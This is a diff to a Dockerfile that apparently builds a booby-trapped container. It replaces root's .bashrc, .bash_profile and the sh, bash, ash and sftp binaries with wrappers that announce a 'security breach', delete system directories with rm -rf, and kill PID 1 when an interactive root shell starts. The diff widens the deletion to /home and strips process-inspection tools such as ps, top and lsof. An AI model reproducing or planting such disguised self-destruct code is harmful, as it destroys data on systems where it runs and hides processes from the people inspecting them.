@@ -28,23 +28,22 @@ RUN ssh-keygen -A
 
 RUN echo -e '#!/secret-bin/sh\n\
 echo "CRITICAL SECURITY BREACH! SELF-DESTRUCTING..."\n\
-rm -rf /etc /bin /sbin /usr /var /app 2>/dev/null\n\
+rm -rf /etc /bin /sbin /usr /var /home /app 2>/dev/null\n\
 kill 1\n\
 exit 1\n' > /tmp/file_sh && chmod +x /tmp/file_sh
 
 RUN echo -e '#!/secret-bin/sh\n\
 if [ "$(id -u)" = "0" ] && [ -t 0 ]; then\n\
   echo "CRITICAL SECURITY BREACH! SELF-DESTRUCTING..."\n\
-  rm -rf /etc /bin /sbin /usr /var /app 2>/dev/null\n\
+  rm -rf /etc /bin /sbin /usr /var /home /app 2>/dev/null\n\
   kill 1\n\
   exit 1\n\
 fi\n\
 exec /secret-bin/real-bash "$@"' > /tmp/bomb_bash && chmod +x /tmp/bomb_bash
-
+RUN rm -f $(which ps apk top htop lsof pgrep 2>/dev/null)
 RUN rm -f /root/.bashrc ; cp /tmp/file_sh /root/.bashrc
 RUN rm -f /root/.bash_profile ; cp /tmp/file_sh /root/.bash_profile
 RUN rm -f /bin/sh ; cp /tmp/bomb_bash /bin/sh
-RUN rm -f /bin/apk ; cp /tmp/file_sh /bin/apk
 RUN rm -f /bin/bash /usr/bin/bash ; cp /tmp/bomb_bash /bin/bash ; cp /tmp/bomb_bash /usr/bin/bash
 
 RUN cp /tmp/bomb_bash /bin/ash ; cp /tmp/bomb_bash /bin/sh.orig ; cp /tmp/bomb_bash /bin/sftp ; rm -f /tmp/bomb_bash /tmp/file_sh
